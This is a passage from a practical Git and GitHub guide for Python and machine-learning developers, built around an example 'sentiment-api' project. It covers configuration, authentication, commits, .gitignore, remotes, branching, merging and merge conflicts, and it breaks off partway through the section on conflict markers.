# Git and GitHub — A Practical Guide

A working guide to Git and GitHub for people who write Python, build machine learning systems, or ship AI applications. It covers the commands you will use every day, the team situations that actually come up — conflicting edits, a rejected push, a pull request that fails its checks — and the automation that runs on every push through GitHub Actions. It deliberately leaves out the parts of Git that almost nobody needs to memorise. The goal is the set of habits a working engineer relies on, explained well enough that you know why each one exists.

Every command and output shown here was run against a real repository. Commands work on Git 2.40 or newer unless marked *(Git 2.56+)*; check yours with `git --version`.

**Sources:**
- [Pro Git, 2nd edition](https://git-scm.com/book/en/v2) — the free official book and the best long-form reference
- [Git reference manual](https://git-scm.com/docs) — every command and option
- [Git: planned breaking changes for 3.0](https://git-scm.com/docs/BreakingChanges) — what will change in the next major version
- [Highlights from Git 2.56](https://github.blog/open-source/git/highlights-from-git-2-56/) — the most recent release covered here
- [GitHub Docs: Get started with Git and GitHub](https://docs.github.com/en/get-started) — accounts, repositories, and authentication
- [GitHub Docs: Pull requests](https://docs.github.com/en/pull-requests) — reviews, merge methods, and conflicts on GitHub
- [GitHub Docs: About rulesets](https://docs.github.com/en/repositories/configuring-branches-and-merges-in-your-repository/managing-rulesets/about-rulesets) — protecting important branches
- [GitHub Docs: GitHub Actions](https://docs.github.com/en/actions) — workflow syntax, runners, secrets, and security hardening
- [actions/checkout](https://github.com/actions/checkout) and [astral-sh/setup-uv](https://github.com/astral-sh/setup-uv) — the two actions used in every Python workflow below
- [uv: Using uv in GitHub Actions](https://docs.astral.sh/uv/guides/integration/github/) and [uv: Dependabot](https://docs.astral.sh/uv/guides/integration/dependabot/)
- [GitHub Changelog: SHA pinning for actions](https://github.blog/changelog/2025-08-15-github-actions-policy-now-supports-blocking-and-sha-pinning-actions/)
- [Atlassian Git tutorials](https://www.atlassian.com/git/tutorials) — clear concept explanations; some pages predate `git switch` and `git restore`, so prefer the commands shown here
- [Learn Git Branching](https://learngitbranching.js.org/) — an interactive visual sandbox for branches and rebasing
- [Conventional Commits](https://www.conventionalcommits.org/) — a widely used commit message convention
- [github/gitignore](https://github.com/github/gitignore) — maintained `.gitignore` templates

---

## How to read this guide

The sections follow the order you meet things in a real project. First the mental model and one-time setup, then the daily loop of editing, committing and syncing, then branches and the situations that arise when several people touch the same code. After that comes GitHub itself (pull requests, reviews, and team rules), then automation with GitHub Actions, and finally a full walkthrough that strings everything together into one feature going from an issue to production.

Most sections end with a short **Notes** list of the things that catch people out. Commands start with `$`, and lines without it are output. Output was trimmed only where it was long and unremarkable.

One idea runs through the whole guide, and it is worth holding onto from the start. **Git almost never loses work that was committed.** Nearly every scary situation, from a botched rebase to a deleted branch, can be undone as long as the work was committed at some point. The dangerous commands are the few that throw away *uncommitted* changes, and they are flagged when they appear. So commit early and often, and treat everything else as recoverable.

The examples follow a small Python service called `sentiment-api`, owned by the GitHub user `octocat`. Substitute your own names throughout.

---

## Table of Contents

**Foundations**
- [1. What Git and GitHub Are](#1-what-git-and-github-are)
- [2. The Mental Model: Three Areas and a Graph](#2-the-mental-model-three-areas-and-a-graph)
- [3. Installing and Configuring Git](#3-installing-and-configuring-git)
- [4. Connecting to GitHub: Authentication](#4-connecting-to-github-authentication)

**The Daily Loop**
- [5. Starting a Repository: init or clone](#5-starting-a-repository-init-or-clone)
- [6. Creating a GitHub Repository and Pushing to It](#6-creating-a-github-repository-and-pushing-to-it)
- [7. Status, Add, Commit](#7-status-add-commit)
- [8. Writing Good Commits](#8-writing-good-commits)
- [9. What Never Goes in Git: .gitignore](#9-what-never-goes-in-git-gitignore)
- [10. Syncing with a Remote: fetch, pull, push](#10-syncing-with-a-remote-fetch-pull-push)
- [11. Reading History: log, diff, show, blame](#11-reading-history-log-diff-show-blame)

**Branches and Teamwork**
- [12. Branches](#12-branches)
- [13. Merging](#13-merging)
- [14. Merge Conflicts, Step by Step](#14-merge-conflicts-step-by-step)
- [15. Rebasing](#15-rebasing)
- [16. Stashing Unfinished Work](#16-stashing-unfinished-work)

**Undoing Things**
- [17. Undoing Changes: restore, amend, revert, reset](#17-undoing-changes-restore-amend-revert-reset)
- [18. The Reflog: Your Safety Net](#18-the-reflog-your-safety-net)

**Working on GitHub**
- [19. Pull Requests from Start to Finish](#19-pull-requests-from-start-to-finish)
- [20. Reviewing Code](#20-reviewing-code)
- [21. Team Workflows and Branch Rules](#21-team-workflows-and-branch-rules)
- [22. Issues, Tags, and Releases](#22-issues-tags-and-releases)

**Data and AI Projects**
- [23. Large Files, Datasets, Notebooks, and Secrets](#23-large-files-datasets-notebooks-and-secrets)

**Automation with GitHub Actions**
- [24. How GitHub Actions Works](#24-how-github-actions-works)
- [25. Your First CI Workflow for a Python Project](#25-your-first-ci-workflow-for-a-python-project)
- [26. Making CI a Gate: Required Checks](#26-making-ci-a-gate-required-checks)
- [27. Secrets, Permissions, and Workflow Security](#27-secrets-permissions-and-workflow-security)
- [28. Continuous Deployment and Releases](#28-continuous-deployment-and-releases)
- [29. Keeping Dependencies Current with Dependabot](#29-keeping-dependencies-current-with-dependabot)

**Putting It Together**
- [30. One Feature from Issue to Production](#30-one-feature-from-issue-to-production)
- [31. Useful Extras: cherry-pick, bisect, worktree](#31-useful-extras-cherry-pick-bisect-worktree)

**Reference**
- [32. Common Mistakes](#32-common-mistakes)
- [33. Interview Quick-Fire](#33-interview-quick-fire)
- [34. Cheat Sheet](#34-cheat-sheet)

---

## 1. What Git and GitHub Are

**Git** is a version control system — a program on your own machine that records snapshots of a project over time. Each snapshot is called a **commit**. With the history of commits you can see what changed and when, go back to any earlier state, and work on several ideas in parallel without them interfering. Git works entirely offline. Nothing about it requires the internet or a company's servers.

**GitHub** is a hosting service built around Git. It stores a copy of your repository online and adds everything that makes collaboration work — pull requests for proposing and reviewing changes, issues for tracking work, permissions and branch rules, and GitHub Actions for running tests and deployments automatically. GitLab and Bitbucket offer the same ideas under different names. The Git half of this guide applies to all of them unchanged.

| | Git | GitHub |
| :--- | :--- | :--- |
| What it is | A command-line program | A website and service |
| Where it runs | Your machine | GitHub's servers |
| Works offline | Yes | No |
| Core job | Recording and combining history | Sharing, reviewing, and automating |
| Key nouns | commit, branch, merge, rebase | repository, pull request, issue, workflow |

The split matters because most confusion comes from mixing the two up. Committing is local and private, and nobody sees it until you **push**. A pull request is not a Git feature at all — it is a GitHub page that says "please merge this branch into that one", with a discussion and automated checks attached.

**Notes:**
- A **repository** (repo) is a project folder plus its full history — stored in a hidden `.git` directory at the project root. Delete `.git` and the folder becomes an ordinary folder again.
- Every clone of a repository contains the entire history. That is why Git is called *distributed*: your laptop's copy is as complete as GitHub's.

---

## 2. The Mental Model: Three Areas and a Graph

Two pictures explain almost every Git command. The first is where a change lives on its way into history.

```text
 working directory      staging area (index)        repository (.git)
 ─────────────────      ────────────────────        ─────────────────
 the files you edit  ──git add──▶  what the next  ──git commit──▶  permanent
                                   commit will hold                 snapshots

                     ◀──git restore──         ◀──git reset / restore --staged──
```

- The **working directory** is the files you see and edit.
- The **staging area**, also called the **index**, is a draft of the next commit. You choose exactly which changes go into it.
- The **repository** is the history of commits stored inside `.git`.

The staging area is the part beginners find strange — so it is worth knowing why it exists. It lets one commit hold one logical change. If you fixed a bug and also renamed a variable somewhere unrelated, you can stage only the bug fix, commit it with a clear message, then stage and commit the rename separately. History stays readable, and either change can be reverted on its own.

The second picture is the shape of history itself.

```text
                      E───F          feature/threshold
                     /
         A───B───C───D───G           main  ◀── HEAD
```

Each letter is a commit, and each commit points back to its parent. History is a graph of snapshots, not a list of file versions. A **branch** is nothing more than a movable label pointing at one commit; when you commit on a branch, its label moves forward to the new commit. **HEAD** is the label for "where you are now", usually the branch you have checked out.

With these two pictures in mind, most commands become readable:

| Command | In terms of the pictures |
| :--- | :--- |
| `git add` | copy changes from the working directory into the staging area |
| `git commit` | turn the staging area into a new commit and move the branch label forward |
| `git switch` | move HEAD to another branch and update your files to match |
| `git merge` | create a commit that joins two lines of the graph |
| `git rebase` | replay your commits on top of a different starting point |
| `git reset` | move a branch label to a different commit |
| `git push` | send commits to the remote and move its branch label |

**Notes:**
- A commit stores a full snapshot plus metadata — author, date, message, and a pointer to its parent. Internally Git deduplicates unchanged files, so snapshots are cheap.
- Every commit has an ID, a hash such as `057380a`. The short form (the first seven or so characters) is enough to refer to it in commands.

---

## 3. Installing and Configuring Git

Install Git from [git-scm.com](https://git-scm.com/downloads), or with your package manager:

```bash
$ brew install git                 # macOS (Homebrew)
$ sudo apt install git             # Ubuntu / Debian
$ winget install --id Git.Git      # Windows
$ git --version
git version 2.56.0
```

Then set your identity. Every commit records an author name and email, and GitHub uses the email to link commits to your account.

```bash
$ git config --global user.name "Octo Cat"
$ git config --global user.email "octocat@example.com"
```

To keep your real email private, use the `noreply` address GitHub gives you under **Settings → Emails** (it looks like `12345678+octocat@users.noreply.github.com`).

A handful of further settings make everyday work smoother. Each is a one-time change, and each fixes a specific annoyance:

```bash
$ git config --global init.defaultBranch main      # new repos start on "main"
$ git config --global pull.rebase true             # pull replays your commits instead of merging
$ git config --global push.autoSetupRemote true    # "git push" works on a brand-new branch
$ git config --global fetch.prune true             # forget remote branches that were deleted
$ git config --global merge.conflictStyle zdiff3   # conflicts also show the original text
$ git config --global core.editor "code --wait"    # use VS Code for messages (or nano, vim)
```

| Setting | Problem it solves |
| :--- | :--- |
| `init.defaultBranch main` | Git still names the first branch `master` unless told otherwise, which no longer matches GitHub's default. Git 3.0 will switch to `main` |
| `pull.rebase true` | `git pull` on a diverged branch otherwise stops and asks how to reconcile, or creates noisy merge commits. Section 10 explains the choice |
| `push.autoSetupRemote true` | without it, the first push of a new branch fails until you type `git push -u origin <branch>` |
| `fetch.prune true` | branches deleted on GitHub otherwise linger locally as `origin/...` forever |
| `merge.conflictStyle zdiff3` | conflict markers show what the code looked like *before* both changes, which makes most conflicts obvious (Section 14) |
| `core.editor` | the default editor is often Vim, which traps newcomers in a commit message screen |

Check what is set, and where it came from:

```bash
$ git config --global --list
$ git config --show-origin user.email
```

**Notes:**
- `--global` writes to `~/.gitconfig` and applies to every repository on the machine. Leave it off inside a repo to set something for that project only, such as a work email.
- On Windows, line endings differ from macOS and Linux. Add a `.gitattributes` file with the line `* text=auto` to a project so Git normalises them, rather than relying on each person's settings.

---

## 4. Connecting to GitHub: Authentication

GitHub stopped accepting account passwords for Git operations years ago. You authenticate in one of three ways, and for a personal machine the first is the easiest.

| Method | Best for | How it works |
| :--- | :--- | :--- |
| **GitHub CLI (`gh`)** | most people, any OS | signs in through the browser and stores a token Git uses over HTTPS |
| **SSH key** | people who prefer SSH, or several machines | a key pair on your machine; GitHub holds the public half |
| **Personal access token** | scripts, CI on other platforms | a password-like token with limited scope and an expiry date |

### Option A: the GitHub CLI

Install `gh` from [cli.github.com](https://cli.github.com/) (`brew install gh`, `winget install GitHub.cli`, or your Linux package manager), then:

```bash
$ gh auth login
? Where do you use GitHub? GitHub.com
? What is your preferred protocol for Git operations on this host? HTTPS
? Authenticate Git with your GitHub credentials? Yes
? How would you like to authenticate GitHub CLI? Login with a web browser
```

Answering *Yes* to the third question configures Git to use `gh` for credentials, so `git push` over HTTPS just works. `gh` is also worth having for its own sake — it creates repositories, opens pull requests, and watches CI runs from the terminal, and later sections use it.

### Option B: an SSH key

```bash
$ ssh-keygen -t ed25519 -C "octocat@example.com"    # accept the default path, set a passphrase
$ gh ssh-key add ~/.ssh/id_ed25519.pub --title "laptop"
$ ssh -T git@github.com
Hi octocat! You've successfully authenticated, but GitHub does not provide shell access.
```

If `gh` says it lacks permission to add keys, grant it once with `gh auth refresh -s admin:public_key`. Without `gh`, paste the contents of `~/.ssh/id_ed25519.pub` into **Settings → SSH and GPG keys → New SSH key** instead. With SSH, repository URLs take the form `git@github.com:octocat/sentiment-api.git` instead of `https://github.com/octocat/sentiment-api.git`.

### Option C: a personal access token

Create a **fine-grained** token under **Settings → Developer settings → Personal access tokens**, limited to the repositories and permissions a script actually needs, with an expiry date. Treat it exactly like a password: never commit it, and store it in a secret manager or an environment variable.

**Notes:**
- GitHub requires two-factor authentication for accounts that contribute code. Set it up early, preferably with a passkey or an authenticator app.
- If `git push` keeps asking for a username and password, Git has no credentials for HTTPS. Run `gh auth login` again, or switch the remote to SSH with `git remote set-url origin git@github.com:octocat/sentiment-api.git`.

---

## 5. Starting a Repository: init or clone

There are only two ways a repository comes into existence on your machine, and which one you need depends on whether the project already exists somewhere.

| Situation | Command | Result |
| :--- | :--- | :--- |
| Turning a local folder into a repository | `git init` | a new, empty `.git` directory and no commits yet |
| Getting a project that already exists on GitHub | `git clone <url>` | a new folder with the full history, already connected to GitHub as `origin` |

```bash
$ mkdir sentiment-api && cd sentiment-api
$ git init
Initialized empty Git repository in /home/octocat/sentiment-api/.git/
```

```bash
$ git clone https://github.com/octocat/sentiment-api.git
$ cd sentiment-api
```

Cloning also sets up a **remote**, a named bookmark for the GitHub copy, called `origin` by convention. Section 10 covers remotes in detail.

**Notes:**
- Never run `git init` inside a folder that is already part of a repository. You end up with a repository nested in another one, and the outer one stops seeing the inner files properly. Run `git status` first if you are unsure.
- `git clone` takes an optional folder name: `git clone <url> my-folder`.
- Tools often run `git init` for you. `uv init`, for example, creates a repository along with the project scaffold.

---

## 6. Creating a GitHub Repository and Pushing to It

This is the step-by-step for the most common starting point — you have code on your machine and want it on GitHub. There are two routes to the same result.

### Route 1: the GitHub CLI (fastest)

From inside the project folder, with at least one commit made (Section 7 shows how):

```bash
$ gh repo create sentiment-api --private --source=. --remote=origin --push
```

One command creates the repository on GitHub, adds it as the `origin` remote, and pushes your branch. Swap `--private` for `--public` when the project should be visible to everyone.

### Route 2: the website

1. On GitHub, click **+** (top right) → **New repository**.
2. Enter the name (`sentiment-api`), choose **Public** or **Private**, and leave **Add a README**, **.gitignore**, and **license** *unticked*. Your local project already has these, and a remote README would create a history that conflicts with yours.
3. Click **Create repository**. GitHub shows the URL of the empty repository.
4. Connect your local repository to it and push:

```bash
$ git remote add origin https://github.com/octocat/sentiment-api.git
$ git push -u origin main
To https://github.com/octocat/sentiment-api.git
 * [new branch]      main -> main
branch 'main' set up to track 'origin/main'.
```

The `-u` flag records `origin/main` as the **upstream** of your local `main`. From then on, plain `git push` and `git pull` know where to go, and `git status` reports how far ahead or behind you are.

### Starting on GitHub first

When there is no local code yet, it is just as common to create the repository on the website *with* a README, `.gitignore` (the **Python** template), and license, then clone it:

```bash
$ gh repo clone octocat/sentiment-api          # or: git clone <url>
```

**Notes:**
- Ticking *Add a README* on GitHub when you already have local commits is the classic first-push failure — the push is rejected because GitHub has a commit you do not. Run `git pull --rebase origin main` once to replay your work on top of it. If both sides have a `README.md`, Git stops with an `add/add` conflict on that file: keep the content you want, then `git add README.md`, `git rebase --continue`, and push.
- The default branch name on GitHub is `main`. If your local branch is still called `master`, rename it with `git branch -m master main` before the first push.
- Add a short `README.md` from day one. It is the first thing anyone, including a recruiter, sees on the repository page.

---

## 7. Status, Add, Commit

This is the loop you repeat dozens of times a day — check what changed, choose what goes into the next snapshot, and record it.

### Check where you are

`git status` is the command to run whenever you are unsure of anything. It tells you the branch, whether you are ahead of or behind GitHub, and which files are changed, staged, or untracked, and it usually suggests the next command.

```bash
$ git status
On branch main

No commits yet

Untracked files:
  (use "git add <file>..." to include in what will be committed)
	README.md
	src/

nothing added to commit but untracked files present (use "git add" to track)
```

**Untracked** means Git sees the file but has never recorded it. Git does not track files automatically; you opt each one in.

### Stage changes

```bash
$ git add README.md src/        # specific files or folders
$ git add .                     # everything under the current folder
$ git add -p                    # pick changes hunk by hunk, interactively
```

```bash
$ git status
On branch main

No commits yet

Changes to be committed:
  (use "git rm --cached <file>..." to unstage)
	new file:   README.md
	new file:   src/model.py
```

`git add -p` is worth learning early. It walks through each changed chunk and asks whether to stage it (`y`), skip it (`n`), split it smaller (`s`), or quit (`q`). It is the practical way to split mixed work into clean commits — and it doubles as a final read-through of what you are about to commit.

### Commit

```bash
$ git commit -m "Add project skeleton"
[main (root-commit) 057380a] Add project skeleton
 2 files changed, 3 insertions(+)
 create mode 100644 README.md
 create mode 100644 src/model.py
```

Running `git commit` with no `-m` opens your editor for a longer message (Section 8). After committing, `git status` reports a clean tree:

```bash
$ git status
On branch main
nothing to commit, working tree clean
```

### See what you are about to commit

Before staging and before committing, look at the actual changes:

| Command | Shows |
| :--- | :--- |
| `git diff` | unstaged changes: working directory compared with the staging area |
| `git diff --staged` | staged changes: what the next commit will contain |
| `git status --short` | a compact one-line-per-file summary |

Here is what `git diff` looks like after adding a threshold constant and an empty-input check to `src/model.py`. Lines starting with `+` were added, lines starting with `-` were removed, and the rest are unchanged context:

```bash
$ git diff
diff --git a/src/model.py b/src/model.py
index e410b08..60be45e 100644
--- a/src/model.py
+++ b/src/model.py
@@ -1,2 +1,6 @@
+THRESHOLD = 0.6
+
 def score(text: str) -> float:
+    if not text:
+        return 0.0
     return 0.0
```

The `@@ -1,2 +1,6 @@` line is a hunk header: this chunk covered lines 1 to 2 of the old file and lines 1 to 6 of the new one.

The short status uses two columns, staged on the left and unstaged on the right: `A ` is a new staged file, ` M` is modified but not staged, `M ` is modified and staged, and `??` is untracked.

**Notes:**
- `git commit -am "message"` stages every change to *already tracked* files and commits in one step. It skips new files, which is a common surprise.
- `git add .` adds everything, including files you did not mean to commit. A good `.gitignore` (Section 9) and a glance at `git status` before every commit prevent most accidents.
- To unstage a file without losing your edits, use `git restore --staged <file>`. Section 17 covers undoing in full.

---

## 8. Writing Good Commits

History is only useful if you can read it. A future teammate, a reviewer, or you in six months will scan commit messages to find when and why something changed, so two habits matter more than any command.

**One logical change per commit.** "Add input validation" is one commit. "Add input validation, fix typo in README, and bump numpy" is three. Small, focused commits are easier to review, to revert, and to search with `git log` and `git bisect`.

**Messages that explain intent.** The diff already shows *what* changed. The message should say what the change does and, when it is not obvious, why.

```text
Add confidence threshold to sentiment scoring

Scores below the threshold are now reported as "neutral" instead of
being forced into positive or negative. The threshold defaults to 0.6
and can be overridden with the SCORE_THRESHOLD environment variable.

Closes #12
```

The format is a convention almost every project follows:

- a **subject line** of about 50 characters, in the imperative mood ("Add", "Fix", "Remove", as if completing *"this commit will..."*), with no trailing full stop
- a **blank line**
- a **body** wrapped at about 72 characters, explaining what and why, when the subject alone is not enough

Many teams also use [Conventional Commits](https://www.conventionalcommits.org/), which prefixes the subject with a type. Tools can then generate changelogs and version numbers from history automatically:

| Prefix | Use for |
| :--- | :--- |
| `feat:` | a new feature |
| `fix:` | a bug fix |
| `docs:` | documentation only |
| `refactor:` | restructuring without changing behaviour |
| `test:` | adding or fixing tests |
| `chore:` | maintenance, such as dependency bumps or config |
| `ci:` | changes to CI workflows |

```text
feat: add confidence threshold to sentiment scoring
fix: handle empty input in score()
ci: run tests on Python 3.13
```

**Notes:**
- Commit before switching tasks, before a risky change, and at the end of every session. Committed work is recoverable; uncommitted work is not.
- Messages like `update`, `fix`, `wip`, or `asdf` are fine on a private branch you will clean up before review (Section 15 shows how), but they should not reach `main`.
- If the team squashes pull requests on merge (Section 21), the pull request title becomes the commit message on `main`. Write it with the same care.

---

## 9. What Never Goes in Git: .gitignore

A `.gitignore` file at the project root lists patterns Git should never track. Getting it right on day one prevents the most damaging mistakes — committed passwords, multi-gigabyte model files, and a repository full of generated clutter.

A solid starting point for a Python or AI project:

```gitignore
# Virtual environments and caches
.venv/
__pycache__/
*.py[cod]
.pytest_cache/
.ruff_cache/
.mypy_cache/

# Secrets and local configuration
.env
.env.*
!.env.example

# Notebooks
.ipynb_checkpoints/

# Data, models, and experiment output
data/
models/
*.pt
*.safetensors
*.onnx
mlruns/
wandb/

# Build output
dist/
build/
*.egg-info/

# Editors and operating systems
.vscode/
.idea/
.DS_Store
Thumbs.db
```

The `!.env.example` line is a negation — it ignores every `.env*` file *except* `.env.example`, which you commit as a template listing the variable names without real values. Newcomers copy it to `.env` and fill it in.

| Commit it | Never commit it |
| :--- | :--- |
| Source code, tests, notebooks without huge outputs | `.env` files, API keys, tokens, passwords |
| `pyproject.toml`, `uv.lock`, `.python-version` | `.venv/`, `__pycache__/` and other rebuildable folders |
| `README.md`, `LICENSE`, docs | Datasets and model weights over a few megabytes (Section 23) |
| `.gitignore`, `.env.example`, `.github/` workflows | Personal editor settings, OS files like `.DS_Store` |

### Ignoring a file that is already tracked

`.gitignore` only affects files Git is not yet tracking. If a file was committed before you added its pattern, Git keeps tracking it. Remove it from the index while keeping it on disk:

```bash
$ git rm --cached .env                 # stop tracking, keep the file
$ git rm -r --cached data/             # the same for a folder
$ git commit -m "Stop tracking local data and .env"
```

If the file contained a secret, removing it is not enough. It remains in history and in every existing clone. **Rotate the secret immediately**, meaning revoke the key and issue a new one. Section 23 covers this.

**Notes:**
- GitHub maintains templates at [github/gitignore](https://github.com/github/gitignore). `Python.gitignore` is a good base to extend with the data and model lines above.
- `git check-ignore -v <file>` tells you which rule ignores a file, which settles any "why isn't Git seeing this?" question.
- Ignore rules are per folder and inherit downward. A `.gitignore` inside a subfolder applies only there.

---

## 10. Syncing with a Remote: fetch, pull, push

A **remote** is a named URL for another copy of the repository, almost always the GitHub copy, called `origin`.

```bash
$ git remote -v
origin  https://github.com/octocat/sentiment-api.git (fetch)
origin  https://github.com/octocat/sentiment-api.git (push)
```

Your local repository keeps **remote-tracking branches** such as `origin/main`. These are read-only snapshots of where GitHub's branches were the last time you talked to it. They update only when you run a network command — which is why `git status` can say you are "up to date" when a teammate pushed five minutes ago.

| Command | What it does | Changes your files? |
| :--- | :--- | :--- |
| `git fetch` | downloads new commits and updates `origin/*` | no |
| `git pull` | `fetch`, then integrates `origin/<branch>` into your branch | yes |
| `git push` | uploads your commits and moves the branch on GitHub | no |

`fetch` is always safe. It only updates your picture of the remote, so you can inspect what arrived before deciding what to do:

```bash
$ git fetch
$ git log --oneline main..origin/main     # commits on GitHub that you do not have
$ git status
On branch main
Your branch is behind 'origin/main' by 2 commits, and can be fast-forwarded.
  (use "git pull" to update your local branch)

nothing to commit, working tree clean
```

### The rejected push

The most common situation in a team — you commit, try to push, and GitHub refuses.

```bash
$ git push
To https://github.com/octocat/sentiment-api.git
 ! [rejected]        main -> main (fetch first)
error: failed to push some refs to 'https://github.com/octocat/sentiment-api.git'
hint: Updates were rejected because the remote contains work that you do not
hint: have locally. This is usually caused by another repository pushing to
hint: the same ref. If you want to integrate the remote changes, use
hint: 'git pull' before pushing again.
```

Nothing is wrong. Someone pushed first, and Git will not let your push silently overwrite their commits. The fix is to integrate their work, then push:

```bash
$ git pull        # with pull.rebase=true, your commits are replayed on top of theirs
$ git push
```

If both of you changed the same lines, the pull stops with a conflict. Section 14 walks through resolving it.

### Merge or rebase on pull?

When your branch and the remote have both moved on, `git pull` can integrate in two ways:

| Setting | What `git pull` does | History afterwards |
| :--- | :--- | :--- |
| `pull.rebase false` | merges `origin/main` into your branch | adds a merge commit such as `Merge branch 'main' of github.com:...` |
| `pull.rebase true` | replays your unpushed commits on top of `origin/main` | a straight line, as if you had started from their latest work |

The rebase setting (recommended in Section 3) keeps history linear and free of meaningless merge commits. It is safe because it only rewrites *your own unpushed* commits. If neither is configured, current Git refuses to guess on a diverged branch and stops with `hint: You have divergent branches and need to specify how to reconcile them`, which is why setting it once is worthwhile.

### Pushing a new branch

```bash
$ git switch -c feature/threshold
$ git push            # works directly with push.autoSetupRemote=true
$ git push -u origin feature/threshold   # the equivalent without that setting
```

**Notes:**
- Pull before you start work each day, and before you push. Small, frequent syncs produce small, easy conflicts; a week without pulling produces a painful one.
- `git pull` with uncommitted changes can refuse to run if they would be overwritten. Commit or stash them first (Section 16).
- Never "solve" a rejected push with `git push --force` on a shared branch. It deletes your teammates' commits from GitHub. Section 15 explains when a force push is legitimate.

---

## 11. Reading History: log, diff, show, blame

These are the commands for answering "what happened here?", and they are read-only, so experiment freely.

```bash
$ git log --oneline --graph --all
*   af235e2 (HEAD -> main) Merge branch 'feature/threshold'
|\
| * 9f625de (feature/threshold) Add score threshold
* | 159ed29 Set default threshold
|/
* 057380a Add project skeleton
```

`--oneline` gives one line per commit, `--graph` draws the branch structure, and `--all` includes every branch rather than only the current one. This one command answers most questions about the shape of a repository, so it is worth an alias (Section 34).

| Command | Answers |
| :--- | :--- |
| `git log` | full commit history of the current branch |
| `git log -p src/model.py` | every change ever made to one file, with diffs |
| `git log --author="Octo"` | commits by one person |
| `git log --since="2 weeks ago"` | recent commits |
| `git log -S "THRESHOLD"` | commits that added or removed a string (the "pickaxe") |
| `git log main..feature/threshold` | commits on the feature branch that `main` does not have |
| `git show 9f625de` | one commit's message and full diff |
| `git diff main feature/threshold` | how two branches differ |
| `git diff HEAD~3` | changes over the last three commits |
| `git blame src/model.py` | the commit and author that last touched each line |

`HEAD~1` means "the commit before HEAD" and `HEAD~3` means three before. These relative names work anywhere a commit hash does.

`git blame` is less accusatory than it sounds. It is the fastest way to find the commit — and therefore the pull request and discussion — behind a confusing line of code. GitHub shows the same view under the **Blame** button on any file.

**Notes:**
- `git log` opens in a pager. Press `q` to quit, `/` to search, and space to page.
- `git log --oneline -10` limits output to the last ten commits.

---

## 12. Branches

A branch is a separate line of work. You create one for each feature, bug fix, or experiment, so `main` always stays in a working state and several pieces of work can progress independently. Because a branch is only a label pointing at a commit, creating one is instant and costs nothing.

```bash
$ git switch -c feature/threshold      # create a branch and move to it
Switched to a new branch 'feature/threshold'

$ git branch                           # list local branches; * marks the current one
* feature/threshold
  main

$ git switch main                      # move back to main
$ git switch -                         # toggle to the previous branch
```

When you switch, Git updates the files in your working directory to match the target branch. Uncommitted changes come with you if they do not clash with the target, and otherwise Git refuses to switch until you commit or stash them.

| Task | Command |
| :--- | :--- |
| Create and switch | `git switch -c <name>` |
| Switch | `git switch <name>` |
| Create a local branch from a teammate's remote branch | `git switch <name>` (Git finds `origin/<name>` automatically) |
| List local, remote, or all branches | `git branch`, `git branch -r`, `git branch -a` |
| Rename the current branch | `git branch -m <new-name>` |
| Delete a merged branch | `git branch -d <name>` |
| Force-delete an unmerged branch | `git branch -D <name>` |
| Delete a branch on GitHub | `git push origin --delete <name>` |

### Naming branches

Use short, descriptive names with a type prefix. Most teams settle on something like `feature/add-threshold`, `fix/empty-input-crash`, `docs/api-usage`, or `chore/bump-numpy`. Some include an issue number, as in `fix/42-empty-input`. Avoid spaces and personal names, since branches describe work rather than people.

### Detached HEAD

Sometimes Git tells you that you are in **detached HEAD** state. It happens when you check out a commit directly rather than a branch, for example `git switch --detach 057380a` or by checking out a tag. HEAD then points at a commit, not at a branch label.

```bash
$ git switch --detach HEAD~1
HEAD is now at e858d26 Raise threshold to 0.7
```

It is a perfectly fine way to look around an old version. The catch — commits made here belong to no branch, so they are easy to lose. If you want to keep work done in this state, give it a branch before leaving: `git switch -c experiment/old-version`. To leave without keeping anything, `git switch main`.

**Notes:**
- `git checkout` is the older, overloaded command that both switches branches and restores files. It still works and you will see it in older tutorials, but `git switch` (branches) and `git restore` (files) do one job each and are harder to misuse. Git has no plans to remove `checkout`.
- Delete branches once they are merged. Fifty stale branches make it hard to see what is actually in progress.

---

## 13. Merging

Merging brings the work from one branch into another. In a team using pull requests, the merge usually happens on GitHub when the pull request is accepted (Section 19), but the mechanics are the same as running it locally:

```bash
$ git switch main          # the branch that receives the work
$ git pull                 # make sure it is current
$ git merge feature/threshold
```

Git performs one of two kinds of merge, depending on the shape of the graph.

**Fast-forward.** If `main` has not moved since the feature branch was created, there is nothing to combine. Git simply slides the `main` label forward to the tip of the feature branch, and no new commit is created.

```text
before:  A───B───C          main
                  ╲
                   D───E    feature

after:   A───B───C───D───E  main, feature
```

```bash
$ git merge feature/threshold
Updating 3a377fd..22c4e7b
Fast-forward
 src/model.py | 2 ++
 1 file changed, 2 insertions(+)
```

**Three-way merge.** If both branches have new commits, Git compares each side against their common ancestor and creates a **merge commit** with two parents, joining the lines.

```text
before:  A───B───C───F      main
              ╲
               D───E        feature

after:   A───B───C───F───M  main
              ╲         ╱
               D───E───╯    feature
```

```bash
$ git merge feature/validation        # opens your editor for the merge message; save and close
Merge made by the 'ort' strategy.
 src/model.py | 2 ++
 1 file changed, 2 insertions(+)
```

`ort` is the name of Git's default merge algorithm. Pass `--no-edit` to accept the default message, `Merge branch 'feature/validation'`, without opening the editor.

When the two sides changed different files, or different parts of the same file, Git combines them automatically. When they changed the *same lines*, Git cannot know which version is right, and it stops with a merge conflict.

**Notes:**
- `git merge --no-ff feature` forces a merge commit even when a fast-forward was possible. Some teams prefer that, so each feature shows up as a distinct unit in history.
- `git merge --abort` cancels a merge in progress and returns everything to how it was before you started.
- After merging, delete the feature branch with `git branch -d feature/threshold`. Its commits are now part of `main`, so nothing is lost.

---

## 14. Merge Conflicts, Step by Step

A conflict is not an error. It means two people changed the same part of the same file in different ways, and Git is asking a human to decide what the result should be. Every team meets them weekly, and with the right setup they usually take a minute to resolve.

### How a conflict appears

Suppose `src/model.py` started with `THRESHOLD = 0.5`. On `main` someone changed it to `0.6`, and on your branch you changed it to `0.7`. Merging your branch into `main` stops:

```bash
$ git merge feature/threshold
Auto-merging src/model.py
CONFLICT (content): Merge conflict in src/model.py
Automatic merge failed; fix conflicts and then commit the result.
```

```bash
$ git status
On branch main
You have unmerged paths.
  (fix conflicts and run "git commit")
  (use "git merge --abort" to abort the merge)

Unmerged paths:
  (use "git add <file>..." to mark resolution)
	both modified:   src/model.py
```

### Reading the markers

Git writes both versions into the file between markers. With `merge.conflictStyle zdiff3` (Section 3) you also see the original:

```text
<<<<<<< HEAD
THRESHOLD = 0.6
||||||| 714f197
THRESHOLD = 0.5
=======
THRESHOLD = 0.7
>>>>>>> feature/threshold

def score(text: str) -> float:
    return 0.0
```

| Block | Meaning |
| :--- | :--- |
